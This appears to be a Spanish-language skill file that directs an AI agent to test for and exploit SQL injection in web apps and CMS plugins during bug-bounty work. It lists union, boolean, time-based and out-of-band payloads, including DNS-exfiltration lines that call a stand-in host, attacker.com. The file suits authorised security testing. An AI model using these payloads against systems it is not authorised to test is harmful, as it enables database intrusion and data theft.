---
name: bug-bounty-sqli
description: Auditoría, identificación y explotación de vulnerabilidades SQL Injection (SQLi) en aplicaciones web, APIs y plugins de CMS. Incluye métodos de extracción in-band, blind, time-based y out-of-band.
---

# Skill: SQL Injection (SQLi) Assessment & Exploitation

Esta habilidad permite al agente identificar puntos de entrada vulnerables a inyección SQL en consultas SQL dinámicas no parametrizadas, evadir sanitizaciones básicas y elevar el impacto (acceso a bases de datos, exfiltración de tablas, RCE via `SELECT INTO OUTFILE` o funciones de sistema).

## 📌 Tipos de Inyección y Diagnóstico

### 1. In-Band SQLi (Union-Based / Error-Based)
- Probar balanceo de comillas: `'`, `"`, `')`, `"))`.
- Detección de errores explícitos (`Syntax error in SQL statement`, `Unclosed quotation mark`).
- Mapeo de columnas mediante `ORDER BY 1,2,3...` y `UNION SELECT NULL, NULL, NULL...`.

### 2. Blind SQLi (Boolean-Based)
- Comparar respuestas entre condiciones verdaderas y falsas:
  - `AND 1=1` vs `AND 1=2`
  - `' AND '1'='1` vs `' AND '1'='2`

### 3. Time-Based Blind SQLi
- Introducir retardos de tiempo en la respuesta del servidor:
  - **MySQL**: `AND SLEEP(5)`
  - **PostgreSQL**: `AND pg_sleep(5)`
  - **MSSQL**: `; WAITFOR DELAY '0:0:5'`
  - **Oracle**: `AND dbms_pipe.receive_message('a', 5)`

### 4. Out-of-Band SQLi (OOB / DNS-HTTP Exfiltration)
- Provocar resoluciones DNS a un dominio controlado por el auditor (`DNSlog`, `Interactsh`):
  - **MySQL**: `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\a'))`
  - **MSSQL**: `EXEC master..xp_dirtree '//attacker.com/a'`

---

## 📚 Casos Históricos de Referencia

Para consultar write-ups de SQLi en empresas como Yahoo, GitHub Enterprise y Uber:
[sqli-techniques.md](file:///C:/Users/logir/.gemini/antigravity-ide/scratch/bug-bounty-skills/skills/bug-bounty-sqli/references/sqli-techniques.md)
